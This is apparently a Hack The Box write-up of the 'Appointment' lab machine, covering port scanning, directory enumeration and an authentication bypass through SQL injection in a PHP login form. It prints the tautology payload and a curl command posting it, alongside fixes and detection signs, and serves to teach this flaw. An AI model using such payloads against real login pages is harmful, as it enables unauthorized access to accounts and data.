---
machine: Appointment
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, sqli, linux, tier1]
---

# Appointment — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

An Apache host runs a login form on **80/tcp** that concatenates user input into the SQL query. The payload `admin' or '1'='1'#` turns the condition into a tautology, the session opens as administrator, and the flag is shown on the dashboard.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

- A single port: **80/tcp**.
- No SSH and no exposed database: the web app is the whole attack surface.
- `whatweb` shows no CMS; it is a small custom PHP app with a login.

## Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

Relevant paths:

```text
/index.php   (200)
/info.php    (200)
/css, /js, /fonts, /images
```

- `/index.php` serves the login form.
- `/info.php` leaks the PHP version and confirms the LAMP stack.
- There is no signup or password reset: the login is the only entry point.

## Foothold

Start with the cheap hypothesis: default credentials (`admin:admin`) → fail. Then test whether the field is injectable.

Username: `admin`
Password: `' or '1'='1'#`

The backend builds something like:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' or '1'='1'#'';
```

- `' or '1'='1` closes the string and appends an always-true condition.
- `#` comments out the rest, including the password check.
- The `SELECT` returns the first row (the administrator) and the app creates the session.

```bash
curl -s -X POST http://<TARGET_IP>/index.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' or '1'='1'#" | grep -i flag
```

The dashboard then shows the flag.

## Lateral movement

- Not applicable: one host, one service.
- The credentials give no access to anything else.

## Privilege escalation

- Not applicable: the flag lives in the application itself, there is no system shell.
- Tier 1 is about understanding the flaw, not chaining an escalation.

## Evidence

- POST request with the payload and the response with the flag redacted.
- No real credentials or flags in the repository: they live in `private/`.

## Lessons learned

- A login form is an injection point before it is a brute-force target.
- The `#` comment (MySQL/MariaDB) is what neutralises the password check; other engines need `--` or `/* */`.
- Trying `admin' or '1'='1'#` takes ten seconds and saves a pointless dictionary attack.
- Read error responses: they tell you whether input reaches the engine unescaped.

## Mitigations and detection

**How to fix it:**

- Parameterised queries (`PDO`/`mysqli`) instead of string concatenation.
- Server-side validation and maximum field length.
- A database user with least privilege (only `SELECT` on the needed columns).
- A WAF as defence in depth, never as the only control.

**How it would be detected:**

- Requests containing quotes, `OR 1=1` or `#` in login fields (WAF and Apache logs).
- SQL errors returned to the client or latency spikes on the database.
- Successful logins with an empty password or a non-existent user.

- CWE-89: SQL Injection
- OWASP Top 10 2021: A03 Injection
- MITRE ATT&CK: [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

## References

- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection)
